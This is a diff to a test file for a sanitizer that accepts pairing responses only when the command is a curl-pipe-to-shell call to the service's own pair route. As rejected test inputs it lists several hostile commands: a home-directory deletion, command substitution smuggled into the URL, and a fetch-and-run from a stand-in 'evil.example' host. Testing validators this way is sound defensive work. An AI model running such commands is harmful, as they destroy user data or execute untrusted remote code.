@@ -536,10 +536,15 @@ describe("bring-your-own machine payloads", () => {
 
   it("a pairing answer is kept only with a curl … | sh command to the pair route", () => {
     const command = "curl -fsSL https://orq.example.com/api/boxes/pair/AbC_12-x | sh";
-    assert.equal(sanitizeByoPairingResponse({ box: machine, command, expiresAt: "2026-10-27T10:30:00.000Z" })?.command, command);
-    assert.equal(sanitizeByoPairingResponse({ box: machine, command: `${command}; rm -rf ~`, expiresAt: "x" }), null);
-    assert.equal(sanitizeByoPairingResponse({ box: machine, command: "curl -fsSL https://evil.example/x | sh", expiresAt: "x" }), null);
-    assert.equal(sanitizeByoPairingResponse({ box: null, command, expiresAt: "x" }), null);
+    const response = { box: machine, command, expiresAt: "2026-10-27T10:30:00.000Z" };
+    assert.equal(sanitizeByoPairingResponse(response)?.command, command);
+    for (const unsafe of [
+      `${command}; rm -rf ~`,
+      "curl -fsSL https://orq.example.com;id;/api/boxes/pair/AbC_12-x | sh",
+      "curl -fsSL https://$(id)/api/boxes/pair/AbC_12-x | sh",
+      "curl -fsSL https://evil.example/x | sh"
+    ]) assert.equal(sanitizeByoPairingResponse({ ...response, command: unsafe }), null, unsafe);
+    assert.equal(sanitizeByoPairingResponse({ ...response, box: null }), null);
     assert.equal(sanitizeByoPairingResponse({ box: machine, command }), null);
   });
 });
